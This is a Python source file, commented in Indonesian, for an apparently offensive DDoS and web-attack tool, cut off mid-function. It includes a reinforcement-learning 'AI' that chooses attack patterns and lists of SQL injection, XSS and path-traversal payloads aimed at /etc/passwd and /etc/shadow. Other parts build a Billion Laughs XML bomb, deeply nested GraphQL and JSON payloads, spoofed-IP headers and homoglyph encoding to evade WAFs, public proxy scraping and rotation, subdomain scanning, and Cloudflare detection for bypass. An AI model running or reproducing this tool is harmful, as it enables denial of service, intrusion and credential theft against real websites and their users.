import socket
import threading
import random
import time
import requests
import json
import sys
import string
from colorama import Fore, init, Style
import os
from fake_useragent import UserAgent
import concurrent.futures
import struct
import ssl
import re
import asyncio
import urllib3
import base64
import ctypes
try:
    import uvloop
except ImportError:
    uvloop = None
import secrets
import statistics
import math
try:
    import resource
except ImportError:
    resource = None
from enum import Enum
from urllib.parse import urlparse, urljoin, quote, urlencode, parse_qs

urllib3.disable_warnings()

# Apply UVLoop for better async performance
if uvloop:
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

try:
    from scapy.all import IP, TCP, UDP, ICMP, send
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    from curl_cffi import requests as cffi_requests
    from curl_cffi.requests import AsyncSession
    CURL_CFFI_AVAILABLE = True
except ImportError:
    cffi_requests = None
    CURL_CFFI_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

from collections import deque, defaultdict
init(autoreset=True)
ua = UserAgent()

class PIYOAIAnalyzer:
    """PIYO-inspired AI analysis for intelligent attack patterns (from m.py)"""
    
    class AttackPattern(Enum):
        CACHE_BYPASS = "cache_bypass"
        DB_STRESS = "database_stress"
        SESSION_EXHAUST = "session_exhaustion"
        MEMORY_PRESSURE = "memory_pressure"
        CONNECTION_DRAIN = "connection_drain"
        CPU_SPIKE = "cpu_spike"
        WAF_EVASION = "waf_evasion"
        GRAPHQL_OVERLOAD = "graphql_overload"

    class Defcon(Enum):
        PEACE = 5
        RECON = 4
        ENGAGE = 3
        SIEGE = 2
        NUCLEAR = 1 # Total Annihilation
        
    def __init__(self):
        # UCB1 State Tracking (Reinforcement Learning)
        # counts: Berapa kali setiap pola dicoba (N)
        # values: Rata-rata reward/keberhasilan pola (Q)
        self.counts = {p: 0 for p in self.AttackPattern}
        self.values = {p: 0.0 for p in self.AttackPattern}
        self.total_trials = 0
        self.successful_payloads = deque(maxlen=50) # Memori Evolusioner
        # Chaos Theory State (Logistic Map)
        self.chaos_x = random.random()
        self.chaos_r = 3.99 # Edge of chaos (Sangat tidak terprediksi)
        self.defcon = self.Defcon.RECON
        self.critical_mass = 0.0 # 0.0 to 100.0 (Uranium Enrichment)

    def register_success(self, payload):
        """Menyimpan payload yang berhasil menembus pertahanan"""
        if payload and payload not in self.successful_payloads:
            self.successful_payloads.append(payload)

    def mutate_payload(self, payload):
        """Mutasi Genetik: Memodifikasi payload sukses sedikit demi sedikit"""
        new_payload = payload.copy()
        if "params" in new_payload:
            params = new_payload["params"].copy()
            # Strategi 1: Tambahkan parameter noise acak
            if random.random() < 0.5:
                params[secrets.token_hex(2)] = secrets.token_hex(2)
            # Strategi 2: Modifikasi nilai yang ada (Case switching / Appending)
            keys = list(params.keys())
            if keys:
                k = random.choice(keys)
                val = str(params[k])
                if random.random() < 0.5:
                    params[k] = val + random.choice(string.ascii_letters)
                else:
                    params[k] = val.swapcase()
            new_payload["params"] = params
        return new_payload

    def crossover_payload(self, parent1, parent2):
        """Genetic Crossover: Menggabungkan dua payload sukses untuk membuat super-payload"""
        child = parent1.copy()
        # Crossover Params
        if "params" in parent1 and "params" in parent2:
            p1 = parent1["params"]
            p2 = parent2["params"]
            child_params = p1.copy()
            # Ambil 50% sifat dari parent2
            keys = list(p2.keys())
            if keys:
                for k in random.sample(keys, len(keys)//2):
                    child_params[k] = p2[k]
            child["params"] = child_params
            
        # Crossover Headers (Jika ada)
        if "headers" in parent1 and "headers" in parent2:
            # Logika serupa bisa diterapkan untuk headers
            pass
            
        return child

    def get_chaotic_delay(self, aggression_level):
        """Generate delay using Logistic Map (Deterministic Chaos) for unpatterned traffic"""
        # Rumus Chaos: x_{n+1} = r * x_n * (1 - x_n)
        self.chaos_x = self.chaos_r * self.chaos_x * (1 - self.chaos_x)
        # Scale to delay: Higher aggression -> Lower delay
        base_delay = 1.0 / max(aggression_level, 0.5)
        return self.chaos_x * base_delay

    def polymorphic_encode(self, text):
        """Polymorphic Encoding: Mengubah bentuk payload untuk menipu Signature WAF"""
        method = random.choice(['url', 'double_url', 'unicode', 'hex', 'none'])
        if method == 'url':
            return quote(text)
        elif method == 'double_url':
            return quote(quote(text))
        elif method == 'hex':
            return ''.join([f"\\x{ord(c):02x}" for c in text])
        elif method == 'unicode':
            # Mengganti karakter ASCII dengan karakter Cyrillic/Unicode yang mirip
            mapping = {'a': 'а', 'e': 'е', 'o': 'о', 'i': 'і', 'c': 'с', 'p': 'р'} 
            return ''.join([mapping.get(c, c) for c in text])
        return text

    def update_pattern_score(self, pattern, success: bool):
        """Reinforcement Learning: Update Q-value menggunakan Incremental Mean"""
        reward = 1.0 if success else 0.0
        
        self.counts[pattern] += 1
        self.total_trials += 1
        
        # Q_n+1 = Q_n + (R - Q_n) / n
        n = self.counts[pattern]
        q_current = self.values[pattern]
        self.values[pattern] = q_current + (reward - q_current) / n
        
        # Uranium Enrichment (Mengumpulkan tenaga untuk serangan nuklir)
        if success:
            self.critical_mass = min(self.critical_mass + 0.5, 100.0)

    def get_adaptive_pattern(self):
        """Pilih pola menggunakan algoritma UCB1 (Upper Confidence Bound)"""
        # Fase Eksplorasi Awal: Pastikan semua pola dicoba minimal sekali
        for p in self.AttackPattern:
            if self.counts[p] == 0:
                return p
        
        # Fase Eksploitasi + Eksplorasi Terukur
        # Rumus UCB1: Q(a) + c * sqrt(ln(t) / N(a))
        # c = 1.414 (sqrt(2)) adalah konstanta eksplorasi standar
        ln_total = math.log(self.total_trials)
        
        def ucb_score(p):
            exploitation = self.values[p]
            exploration = math.sqrt((2 * ln_total) / self.counts[p])
            return exploitation + exploration
            
        return max(self.AttackPattern, key=ucb_score)

    def detect_soft_block(self, body_content: bytes) -> bool:
        """Mendeteksi Soft Block (200 OK tapi isinya Captcha/Block page)"""
        if not body_content: return False
        try:
            text = body_content.decode('utf-8', errors='ignore').lower()
            keywords = [
                'captcha', 'challenge', 'security check', 'access denied', 
                'forbidden', 'block', 'firewall', 'cloudflare', 'ddos-guard',
                'human verification', 'i am human', 'rate limit', 'error 1015',
                'error 1020', 'access restricted', 'just a moment'
            ]
            # Block page biasanya kecil (< 15KB) dan mengandung keyword
            return len(text) < 15000 and any(k in text for k in keywords)
        except:
            return False

    def analyze_response(self, url: str, status: int, headers: dict, 
                        body_size: int, response_time: float, body_content: bytes = None) -> list:
        """Analyze HTTP response to determine effective attack patterns"""
        effective_patterns = []
        
        # Analyze cache headers
        cache_control = headers.get('Cache-Control', '').lower()
        if 'max-age' in cache_control or 'public' in cache_control:
            effective_patterns.append(self.AttackPattern.CACHE_BYPASS)
        
        # Analyze response time for DB indicator
        if response_time > 0.5:  # >500ms response suggests DB involvement
            effective_patterns.append(self.AttackPattern.DB_STRESS)
            
        # Analyze content type for processing needs
        content_type = headers.get('Content-Type', '').lower()
        if any(x in content_type for x in ['image', 'video', 'pdf', 'zip']):
            effective_patterns.append(self.AttackPattern.CPU_SPIKE)
            
        # Analyze body size for memory pressure
        if body_size > 1024 * 1024:  # >1MB response
            effective_patterns.append(self.AttackPattern.MEMORY_PRESSURE)
            
        # Analyze headers for session indicators
        if 'Set-Cookie' in headers or 'session' in str(headers).lower():
            effective_patterns.append(self.AttackPattern.SESSION_EXHAUST)
            
        # Analyze for Soft Block (Smart WAF)
        if body_content and self.detect_soft_block(body_content):
            effective_patterns.append(self.AttackPattern.WAF_EVASION)

        # Analyze for WAF/Rate Limiting (Microsoft/Cloudflare/etc)
        server_header = headers.get('Server', '').lower()
        if status in [403, 406, 429] or any(w in server_header for w in ['cloudflare', 'akamai', 'imperva', 'microsoft', 'azure']):
            effective_patterns.append(self.AttackPattern.WAF_EVASION)
            
        return list(set(effective_patterns))

    def generate_intelligent_payload(self, url: str, pattern: AttackPattern) -> dict:
        """Generate intelligent payload based on attack pattern"""
        # Fase Eksploitasi: Gunakan payload hasil evolusi jika tersedia (60% chance)
        if self.successful_payloads and random.random() < 0.6:
            if len(self.successful_payloads) >= 2 and random.random() < 0.3:
                # Crossover (Kawin silang payload)
                p1, p2 = random.sample(self.successful_payloads, 2)
                base = self.crossover_payload(p1, p2)
            else:
                # Mutasi biasa
                base = random.choice(self.successful_payloads)
            return self.mutate_payload(base)

        payload = {
            "url": url,
            "params": {},
            "headers": {},
            "method": "GET"
        }
        
        if pattern == self.AttackPattern.CACHE_BYPASS:
            payload["params"] = {
                "_cache": secrets.token_hex(8),
                "_ts": int(time.time() * 1000),
                "nocache": "1",
                "random": random.randint(1, 1000000)
            }
            
        elif pattern == self.AttackPattern.DB_STRESS:
            # Enhanced DB Stress Payloads (Time-based & Boolean-based Blind)
            sqli_payloads = [
                "' OR '1'='1", "1' ORDER BY 1--+", "1' UNION SELECT NULL--",
                "admin' --", "1' AND SLEEP(3)--+", "1' OR BENCHMARK(1000000,MD5(1))",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--+", "1' OR 1=1#"
            ]
            payload["params"] = {
                "id": random.choice([str(random.randint(1, 1000000)), random.choice(sqli_payloads)]),
                "search": self.polymorphic_encode(random.choice(sqli_payloads)),
                "sort": random.choice(["name", "date", "price", "rating", "1", "if(1=1,1,(select 1 union select 2))"]),
                "limit": random.choice([str(random.randint(100, 1000)), "999999", "-1"])
            }
            
        elif pattern == self.AttackPattern.SESSION_EXHAUST:
            payload["headers"] = {
                "Cookie": f"session_{secrets.token_hex(8)}={secrets.token_hex(32)}",
                "X-Session-Id": secrets.token_hex(16)
            }
            
        elif pattern == self.AttackPattern.MEMORY_PRESSURE:
            payload["params"] = {
                "data": "A" * random.randint(1000, 5000),
                "include": "everything"
            }
            
            # Vampire Payload: Deep Nesting for JSON parsers (Resource Exhaustion)
            if random.random() < 0.3:
                depth = random.randint(50, 100)
                nested = {"root": "start"}
                for _ in range(depth):
                    nested = {"n": nested}
                payload["params"] = nested
            
        elif pattern == self.AttackPattern.CPU_SPIKE:
            payload["params"] = {
                "process": "true",
                "compress": "maximum",
                "encrypt": "AES256"
            }
            
        elif pattern == self.AttackPattern.WAF_EVASION:
            # Payload untuk membingungkan WAF tentang asal IP
            payload["headers"] = {
                "X-Forwarded-For": "127.0.0.1",
                "X-Originating-IP": "127.0.0.1",
                "X-Remote-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1"
            }
            # Parameter acak untuk menghindari cache rule WAF
            payload["params"] = {
                f"bypass_{random.randint(1,1000)}": secrets.token_hex(4)
            }

        elif pattern == self.AttackPattern.GRAPHQL_OVERLOAD:
            # Deeply nested query for CPU Amplification (Graph Complexity)
            depth = random.randint(5, 15)
            # Query rekursif jahat
            query = "query { " + ("user { " * depth) + "id name" + (" } " * depth) + "}"
            payload["method"] = "POST"
            payload["params"] = {"query": query}
            
        return payload

    def generate_nuclear_payload(self):
        """Payload Kiamat: Dirancang untuk menghancurkan parser dan memori"""
        payloads = [
            # XML Billion Laughs (Memory Bomb)
            {"type": "xml", "data": '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>'},
            # HTTP Header Overflow
            {"type": "header", "data": {"X-Nuke": "A" * 819787787378129732186378123878787887872}},
            # JSON Deep Nesting (Stack Overflow)
            {"type": "json", "data": {"a": {"b": {"c": {"d": "e"*100000638721376127000}}}} }, # Simplified for brevity, logic handles depth
            # SQL Polyglot
            {"type": "sql", "data": "SLEEP(10) /*' or SLEEP(10) or '\" or SLEEP(10) or \"*/"}
        ]
        payload = random.choice(payloads)
        if payload["type"] == "json":
            # Deep nesting generator
            obj = "root"
            for _ in range(100): obj = {secrets.token_hex(2): obj}
            payload["data"] = obj
            
        return payload
        
    def get_insights(self, learning_data):
        """Get AI insights for display"""
        if self.total_trials == 0: return "AI sedang mengumpulkan data awal..."
        
        # Cari pola terbaik berdasarkan value murni (Win Rate)
        best_p = max(self.values, key=self.values.get)
        best_val = self.values[best_p]
        
        avg_time = statistics.mean(learning_data["response_times"]) if learning_data["response_times"] else 0
        
        return (f"Best Strategy: {best_p.name} (Win Rate: {best_val:.1%}) | "
                f"Trials: {self.total_trials} | "
                f"Avg Latency: {avg_time*1000:.2f}ms")

    def generate_fake_ja4(self):
        """Generate fake JA4 fingerprint string for log confusion"""
        # Format: Protocol+Version+DestType+NumCiphers+NumExts_CipherHash_ExtHash
        # Contoh: t13d1516h2_8daaf6152771_e82a403c3836
        proto = "t13" # TCP TLS 1.3
        dest = "d" # Domain
        num_ciphers = random.randint(10, 20)
        num_exts = random.randint(5, 15)
        algo = random.choice(["h1", "h2"])
        cipher_hash = secrets.token_hex(6)
        ext_hash = secrets.token_hex(6)
        return f"{proto}{dest}{num_ciphers:02d}{num_exts:02d}{algo}_{cipher_hash}_{ext_hash}"

    def get_browser_fingerprints(self):
        """Expanded list for curl_cffi to maximize JA4/TLS Fingerprint rotation"""
        return [
            "chrome110", "chrome111", "chrome112", "chrome116", "chrome119", "chrome120",
            "edge101", "edge103", "edge110", "edge119",
            "safari15_3", "safari15_5", "safari16_0", "safari17_0",
            "firefox109", "firefox117"
        ]

class testhard:
    def __init__(self, target, port=80, threads=1000, proxies_file="proxiess.txt", user_agents_file="user_agents.txt"):
        self.running = True
        self.target = target
        self.target_ips = []
        
        # Handle Multi-Port Input
        if isinstance(port, list):
            self.target_ports = port
            self.port = port[0] # Primary port for fallback
        else:
            self.target_ports = [port]
            self.port = port
        self.kill_chain_locked = False
        self.start_time = time.time()
        self.dynamic_mode = False # Flag untuk mode burst (agar thread bisa ganti strategi)
        
        # Optimasi SSL Context (Global Reuse seperti apDDOS)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        self.nuclear_launch_code = threading.Event() # Sinyal untuk serangan serentak
            
        try:
            # Resolve semua IP untuk dukungan Round-Robin DNS
            infos = socket.getaddrinfo(target, None, socket.AF_INET, socket.SOCK_STREAM)
            self.target_ips = list(set([info[4][0] for info in infos]))
            self.target_ip = self.target_ips[0] # Fallback
            print(f"{Fore.GREEN}[+] Resolved {len(self.target_ips)} IPs for {target}: {', '.join(self.target_ips)}")
        except:
            self.target_ip = target
            self.target_ips = [target]
            
        self.optimize_system()
        # Start DNS Refresher for large targets (Anycast/Round-Robin)
        if self.port in [80, 443] or (self.target_ports and (80 in self.target_ports or 443 in self.target_ports)):
            threading.Thread(target=self.dns_refresher, daemon=True).start()

        self.threads = threads
        self.proxy_cooldowns = {}
        self.proxy_lock = threading.Lock()
        self.proxies = self.load_proxies(proxies_file)
        
        self.aggression_level = 1.0 # Multiplier Agresi Dinamis
        if self.proxies:
            self.check_proxies()

        self.user_agents = self.load_user_agents(user_agents_file)
        
        # Optimasi: Generate cache User-Agent jika file kosong/tidak ada
        if not self.user_agents:
            print(f"{Fore.YELLOW}[*] Generating 1000 random User-Agents (Cache)...")
            self.user_agents = [ua.random for _ in range(1000)]
            
        self.proxy_index = 0
        self.stats = {"packets": 0, "requests": 0, "connections": 0}
        self.running = True
        self.junk_pool = os.urandom(2 * 1024 * 1024) # 2MB random data pool for fast payload generation
        
        # Global AI Learning Data (for AI Monitor and Orchestrator)
        self.global_learning_data = { # Moved here from PIYOAIAnalyzer
            "response_times": deque(maxlen=1000), # Keep last 1000 samples
            "status_codes": defaultdict(int),
            "errors": defaultdict(int)
        }
        
        # Initialize AI Analyzer
        self.ai = PIYOAIAnalyzer()
        
        # Payloads from c.py
        self.sql_payloads = [
            "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
            "1 UNION SELECT NULL", "1' AND 1=1", "1' AND 1=2",
            "1' OR SLEEP(5)", "1' OR BENCHMARK(1000000,MD5(1))",
            "admin' --", "admin' #", "' OR 1=1--", "' OR 1=1#",
            "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--+"
        ]
        self.xss_payloads = [
            '<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>', '<body onload=alert(1)>',
            '"><script>alert(1)</script>', "'><script>alert(1)</script>",
            '<iframe src="javascript:alert(1)">', '<details ontoggle=alert(1)>',
            '<audio src=x onerror=alert(1)>', '<video src=x onerror=alert(1)>'
        ]
        self.lfi_payloads = [
            '../../../../etc/passwd', '../../../../windows/win.ini',
            '..%2f..%2f..%2f..%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252f..%252fetc%252fpasswd',
            '/etc/passwd', '/etc/shadow', '/etc/issue', '/etc/group',
            '/etc/hostname', '/etc/ssh/ssh_config',
            'C:\\boot.ini', 'C:\\WINDOWS\\win.ini'
        ]

    def dns_refresher(self):
        """Refresh target IPs periodically to hit active nodes (Anti-Sinkhole)"""
        while self.running:
            time.sleep(60) # Refresh every 60s
            try:
                infos = socket.getaddrinfo(self.target, None, socket.AF_INET, socket.SOCK_STREAM)
                new_ips = list(set([info[4][0] for info in infos]))
                if new_ips: self.target_ips = new_ips
            except: pass

    def optimize_system(self):
        """Increase OS limits for high concurrency (Linux/Mac only)"""
        if resource:
            try:
                soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
                resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
                print(f"{Fore.GREEN}[+] System limits optimized: Open Files set to {hard}")
            except Exception: pass

    def parse_proxy(self, proxy_str):
        """Parse proxy string into (ip, port, user, pass) handles user:pass@ip:port"""
        proxy_str = proxy_str.replace("http://", "").replace("https://", "")
        if "@" in proxy_str:
            auth, endpoint = proxy_str.split("@")
            username, password = auth.split(":")
            ip, port = endpoint.split(":")
            return ip, int(port), username, password
        else:
            ip, port = proxy_str.split(":")
            return ip, int(port), None, None

    def load_proxies(self, file):
        """Load proxy list dari file"""
        try:
            with open(file, 'r') as f:
                return list(set([line.strip() for line in f if line.strip()]))
        except:
            print(f"{Fore.YELLOW}[!] Proxy file tidak ditemukan. Pakai tanpa proxy.")
            return []

    def load_user_agents(self, file):
        """Load User-Agent list dari file"""
        try:
            with open(file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            print(f"{Fore.YELLOW}[!] User-Agent file tidak ditemukan. Menggunakan fake_useragent.")
            return []

    def scrape_proxies(self):
        """Scrape proxy otomatis dari sumber publik"""
        print(f"{Fore.MAGENTA}[*] Auto-Scraping proxy baru dari internet...")
        sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
            "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
            "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
            "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
            "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
            "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
            "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt",
            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt"
        ]
        new_proxies = set()
        for url in sources:
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    found = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}\b", r.text)
                    new_proxies.update(found)
            except: pass
        
        if new_proxies:
            # Gabungkan proxy lama (dari file) dengan proxy baru (dari internet)
            combined_proxies = set(self.proxies) | new_proxies
            self.proxies = list(combined_proxies)
            # Simpan ke file
            try:
                with open("proxiess.txt", "w") as f:
                    for p in self.proxies:
                        f.write(p + "\n")
            except: pass
            print(f"{Fore.GREEN}[+] Berhasil scrape {len(new_proxies)} proxy baru. Total sekarang: {len(self.proxies)} proxy.")
            self.check_proxies()
        else:
            print(f"{Fore.RED}[!] Gagal scrape proxy, menggunakan yang lama.")

    def check_proxies(self):
        """Filter proxy mati"""
        if not self.proxies: return
        print(f"{Fore.YELLOW}[*] Memeriksa {len(self.proxies)} proxy (Validasi HTTP & 407)...")
        working = []
        def check(proxy):
            try:
                # Gunakan requests untuk validasi status code (hindari 407/403 dari proxy itu sendiri)
                proxies = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}",
                }
                # Cek koneksi ke target netral untuk memastikan proxy bersih
                r = requests.get("http://www.google.com", proxies=proxies, timeout=5)
                if r.status_code == 200:
                    working.append(proxy)
            except: pass
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=300) as executor:
            executor.map(check, self.proxies)
        
        self.proxies = working
        print(f"{Fore.GREEN}[+] {len(working)} proxy VALID siap digunakan.")

    def get_target_ip(self):
        """Get random target IP from resolved list (Round-Robin support)"""
        return random.choice(self.target_ips)

    def get_user_agent(self):
        """Get random User-Agent"""
        if self.user_agents:
            return random.choice(self.user_agents)
        return ua.random

    def get_rotated_headers(self):
        """Generate rotated headers with fake JA4 to confuse WAF logs"""
        headers = {
            'User-Agent': self.get_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.5', 'id-ID,id;q=0.5']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'X-JA4-Fingerprint': self.ai.generate_fake_ja4() # Fake Header injection
        }
        return headers

    def report_dead_proxy(self, proxy_str):
        """Menandai proxy yang gagal agar tidak digunakan sementara waktu."""
        # Hapus prefix scheme jika ada
        proxy_str = proxy_str.replace("http://", "").replace("https://", "")
        with self.proxy_lock:
            # Istirahatkan proxy selama 60 detik
            self.proxy_cooldowns[proxy_str] = time.time() + 60

    def get_proxy(self):
        """Rotasi proxy secara acak dengan sistem cooldown."""
        if not self.proxies:
            return None
        
        with self.proxy_lock:
            now = time.time()
            # Filter proxy yang tidak sedang dalam masa cooldown
            valid_proxies = [p for p in self.proxies if self.proxy_cooldowns.get(p, 0) < now]

            if not valid_proxies:
                return None # Tidak ada proxy yang tersedia saat ini

            proxy = random.choice(valid_proxies)
            return {"http": f"http://{proxy}", "https": f"http://{proxy}"} # Mendukung HTTPS proxy juga

    def generate_smart_ip(self):
        """Generate random public IP, avoiding private/reserved ranges"""
        while True:
            octet1 = random.randint(1, 223)
            if octet1 in [10, 127]: continue
            
            octet2 = random.randint(0, 255)
            if octet1 == 172 and 16 <= octet2 <= 31: continue
            if octet1 == 192 and octet2 == 168: continue
            if octet1 == 169 and octet2 == 254: continue
            
            return f"{octet1}.{octet2}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def generate_payload(self, min_size=64, max_size=1024):
        """Generate random payload (junk data) from pool for speed"""
        size = random.randint(min_size, max_size)
        start = random.randint(0, len(self.junk_pool) - size)
        return self.junk_pool[start:start+size]

    def get_random_port(self):
        """Intelligently select a random port with higher weight on common ports."""
        common_ports = [
            80, 443, 21, 22, 23, 25, 53, 110, 111, 135, 139, 143, 445, 993, 995, 
            1723, 3306, 3389, 5900, 8080, 8443, 8000, 8888, 25565, 27015, 27016, 
            7777, 9987, 5353, 1900,
            # Added critical infrastructure ports
            6379, 11211, 9200, 27017, 5672, 161, 123, 5060, 1433, 1521, 5432
        ]
        
        # 60% chance to pick a common port, 40% chance for a fully random port
        if random.random() < 0.6:
            return random.choice(common_ports)
        else:
            return random.randint(1, 65535)

    def new_dangerous_function(self):
        """Fungsi Baru Berbahaya: Mutasi Payload & Jitter Agresif"""
        # OPTIMIZATION: Reduced frequency (0.1%) and REMOVED sleep for maximum throughput
        if random.random() < 0.001:
            self.junk_pool = os.urandom(random.randint(1024, 4096))

    def get_target_port(self, layer="l7"):
        """Smart Port Selection: Random for L4, Fixed for L7"""
        # Jika user memasukkan list port spesifik (misal: 22,53,80,443)
        if self.target_ports and self.target_ports != [0]:
            if layer == "l7":
                # Untuk L7, hanya pilih port web jika ada dalam list
                web_ports = [p for p in self.target_ports if p in [80, 443, 8080, 8443, 8000, 8888]]
                if web_ports: return random.choice(web_ports)
                # Fallback ke 80/443 jika user hanya memberi port non-web (misal: 22) untuk serangan L7
                return random.choice([80, 443])
            # Untuk L4 atau jika tidak ada port web, pilih acak dari list user
            return random.choice(self.target_ports)
            
        # Jika mode 0 (Random/Auto)
        if layer == "l4": return random.randint(1, 65535)
        return random.choice([80, 443])

    def scan_subdomains(self):
        """Quick Subdomain Discovery to widen attack surface"""
        if self.port not in [80, 443]: return
        print(f"{Fore.CYAN}[*] Scanning common subdomains for wider L4 attack surface...")
        common = ['www', 'api', 'cdn', 'img', 'static', 'admin', 'login', 'mail', 'webmail', 'db', 'dashboard']
        
        def check(sub):
            host = f"{sub}.{self.target}"
            try:
                ip = socket.gethostbyname(host)
                if ip not in self.target_ips:
                    self.target_ips.append(ip)
            except: pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check, common)
        print(f"{Fore.GREEN}[+] Total Target IPs (incl. subdomains): {len(self.target_ips)}")

    def analyze_target(self):
        """AI Analysis: Deteksi WAF & Tipe Server untuk Optimasi Vektor Serangan"""
        print(f"{Fore.CYAN}[*] AI Brain: Menganalisis tanda tangan target...")
        weights = {
            "l4": 1, "l7": 1, "bypass": 1, "amp": 1, "cffi": 1, "slow": 1
        }

        if self.port == 0 or (len(self.target_ports) > 1 and 0 in self.target_ports):
            print(f"{Fore.RED}[!] Mode Serangan Infrastruktur (Port Acak). AI fokus pada Serangan Volumetrik L4.")
            weights.update({"l4": 30, "l7": 0, "bypass": 0, "amp": 10, "slow": 0, "quantum": 0}) # Quantum juga dinonaktifkan
            if self.proxies:
                print(f"{Fore.GREEN}[+] Proxy terdeteksi: Mengaktifkan TCP Proxy Flood untuk Port Acak.")
                weights["proxy_l4"] = 15
            return weights

        # Cek apakah ada port web dalam list target
        web_ports = [p for p in self.target_ports if p in [80, 443, 8080, 8443]]
        try:
            # Auto-scan subdomains to add to L4 target pool
            self.scan_subdomains()

            if web_ports:
                probe_port = web_ports[0] # Ambil port web pertama untuk analisis
                scheme = "https" if probe_port in [443, 8443] else "http"
                url = f"{scheme}://{self.target}:{probe_port}"
                r = None

                # --- HTTP Version Detection using curl_cffi ---
                if CURL_CFFI_AVAILABLE:
                    try:
                        print(f"{Fore.CYAN}[*] AI Probe: Mendeteksi versi HTTP...")
                        r = cffi_requests.get(url, impersonate="chrome120", timeout=5, verify=False)
                        http_version = r.http_version
                        if http_version == 2:
                            print(f"{Fore.GREEN}[+] Target mendukung HTTP/2. Meningkatkan bobot serangan CFFI & Quantum.")
                            weights.update({"cffi": 25, "quantum": 15, "l4": 0.1, "l7": 1})
                        elif http_version == 3:
                            print(f"{Fore.GREEN}[+] Target mendukung HTTP/3 (QUIC). Meningkatkan bobot serangan QUIC & L4 UDP.")
                            weights.update({"quantum": 20, "l4": 15, "cffi": 5, "l7": 0.1})
                        else:
                            print(f"{Fore.YELLOW}[+] Target menggunakan HTTP/1.1. Fokus pada serangan L7 tradisional.")
                            weights.update({"l7": 15, "cffi": 1, "quantum": 1, "l4": 1})
                    except Exception:
                        print(f"{Fore.RED}[!] Probe CFFI gagal. Fallback ke analisis standar.")

                # --- WAF & Server Signature Detection ---
                if r is None: # Fallback if CFFI probe failed or was unavailable
                    r = requests.get(url, timeout=5, verify=False)
                headers = str(r.headers).lower()

                if "cloudflare" in headers or "cf-ray" in headers:
                    print(f"{Fore.YELLOW}[!] Cloudflare Terdeteksi! Beralih ke Mode Bypass.")
                    weights.update({"cffi": 20, "bypass": 10, "l7": 1, "l4": 0.1, "quantum": 5}) # CFFI dan Quantum untuk bypass
                elif "akamai" in headers:
